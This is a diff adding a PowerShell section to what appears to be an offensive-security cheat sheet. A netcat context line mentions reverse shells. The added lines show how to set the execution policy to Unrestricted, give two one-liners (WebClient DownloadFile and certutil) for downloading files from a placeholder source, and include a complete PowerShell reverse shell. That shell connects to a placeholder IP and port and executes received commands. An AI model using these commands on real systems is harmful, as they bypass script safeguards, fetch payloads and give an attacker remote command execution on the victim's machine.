@@ -44,6 +44,37 @@ nc -nv $(ip) $(port)
 It can also be used to transfer files, open reverse shell and much more.
 
 # PowerShell
+It maintains an execution policy which describes which powershell scipts can be run and which cannot be.
+By default it is restricted.
+You can unrestrict is by using the following the command
+
+```ps1
+Set-ExecutionPolicy Unrestricted
+```
+And you can check it by the following command
+
+```ps1
+Get-ExecutionPolicy
+```
+## Transfer file using powershell
+
+* ```ps1
+powershell -c "(new-object System.Net.WebClient).DownloadFile('$(source localtion)', '$(targetlocation)')"
+```
+* ```ps1
+certutil -urlcache -f "$(source location)" $(filename)
+```
+
+
+# Powershell reverse Shell
+
+```ps1
+$client = New-Object System.Net.Sockets.TCPClient('$(ip)',$(port));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+
+
+
 
 
 
